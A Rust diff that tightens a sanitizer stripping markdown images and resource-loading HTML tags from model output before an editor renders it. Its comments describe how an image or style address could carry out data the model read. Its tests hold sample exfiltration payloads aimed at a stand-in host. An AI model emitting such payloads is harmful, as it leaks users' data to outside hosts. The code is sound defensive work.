@@ -495,17 +495,35 @@ fn plain(text: &str) -> String {
     without_loading(&pictured(text))
 }
 
-/// The tags that make a renderer open a connection to draw them.
-const LOADING_TAGS: [&str; 14] = [
+/// Bare tags an editor still gets, because they carry no attribute to load anything from but
+/// whose content or kind does: a `<style>` body can `@import` an address and a `<script>` runs.
+const BARE_BUT_LOADING: [&str; 15] = [
     "img", "image", "picture", "source", "video", "audio", "track", "iframe", "frame", "embed",
-    "object", "link", "script", "svg",
+    "object", "link", "script", "svg", "style",
 ];
 
-/// `text` with no markdown image and no HTML tag that loads a resource. An editor draws an image
-/// the moment a message arrives, with no click, so `![](https://host/?q=<what the model read>)`
-/// would carry out whatever the model put in the address. Each is cut by a space, which is visible
-/// and leaves the address in the message for a reader to see. A link is left alone, since drawing
-/// one loads nothing.
+/// Whether `rest`, the text after a `<`, is a tag with no attribute at all, such as `<b>`,
+/// `</code>` or the `<String>` in `Vec<String>`. With nothing between the name and the `>` there
+/// is no `src`, `href`, `background` or `style` for an editor to fetch from.
+fn is_bare_tag(rest: &str) -> bool {
+    let rest = rest.strip_prefix('/').unwrap_or(rest);
+    let Some((name, _)) = rest.split_once('>') else {
+        return false;
+    };
+    name.starts_with(|c: char| c.is_ascii_alphabetic())
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
+        && !BARE_BUT_LOADING
+            .iter()
+            .any(|tag| tag.eq_ignore_ascii_case(name))
+}
+
+/// `text` with no markdown image and no HTML tag that could load a resource. An editor draws an
+/// image the moment a message arrives, with no click, so `![](https://host/?q=<what the model
+/// read>)` would carry out whatever the model put in the address. The same goes for a tag with an
+/// attribute that names an address (`<input type=image src=..>`, `<div style="background:url(..)">`,
+/// `<table background=..>`), so every `<` that starts a tag, a closing tag, a comment or an
+/// instruction is cut by a space unless the tag is bare. A cut is visible and leaves the address in
+/// the message for a reader to see. A link is left alone, since drawing one loads nothing.
 fn without_loading(text: &str) -> String {
     let text = text.replace("![", "! [");
     let mut out = String::with_capacity(text.len());
@@ -513,14 +531,8 @@ fn without_loading(text: &str) -> String {
     while let Some(at) = rest.find('<') {
         out.push_str(&rest[..=at]);
         rest = &rest[at + 1..];
-        let name = rest
-            .split(|c: char| !c.is_ascii_alphanumeric())
-            .next()
-            .unwrap_or_default();
-        if LOADING_TAGS
-            .iter()
-            .any(|tag| tag.eq_ignore_ascii_case(name))
-        {
+        let starts_tag = rest.starts_with(|c: char| c.is_ascii_alphabetic() || "/!?".contains(c));
+        if starts_tag && !is_bare_tag(rest) {
             out.push(' ');
         }
     }
@@ -582,7 +594,7 @@ fn turn_params(session: &str, blocks: Option<&Value>) -> Result<Value, String> {
                     .ok_or("a resource link holds a string `uri`")?;
                 let path = path_of(uri)
                     .ok_or_else(|| format!("only a file: link can be attached, not {uri}"))?;
-                if bravebot_agent::workspace::media_for(&path).is_some() {
+                if bravebot_filetype::by_name::media_for(&path).is_some() {
                     attachments.push(path);
                 } else {
                     dropped.push(path);
@@ -1679,6 +1691,22 @@ mod tests {
         assert_eq!(
             plain("<IMG src=x><picture><SvG/><iframe>"),
             "< IMG src=x>< picture>< SvG/>< iframe>"
+        );
+        assert_eq!(
+            plain(concat!(
+                "<input type=\"image\" src=\"https://h.test/?q=1\">",
+                "<div style=\"background:url(https://h.test/?q=2)\">x</div>",
+                "<style>@import url(https://h.test/?q=3);</style>",
+                "<table background=\"https://h.test/?q=4\"><td background=h>",
+                "<!-- c --><?x?>",
+            )),
+            concat!(
+                "< input type=\"image\" src=\"https://h.test/?q=1\">",
+                "< div style=\"background:url(https://h.test/?q=2)\">x</div>",
+                "< style>@import url(https://h.test/?q=3);< /style>",
+                "< table background=\"https://h.test/?q=4\">< td background=h>",
+                "< !-- c -->< ?x?>",
+            )
         );
         assert_eq!(
             plain("[a link](https://h.test/) Vec<String> <b>bold</b> 1 < 2"),
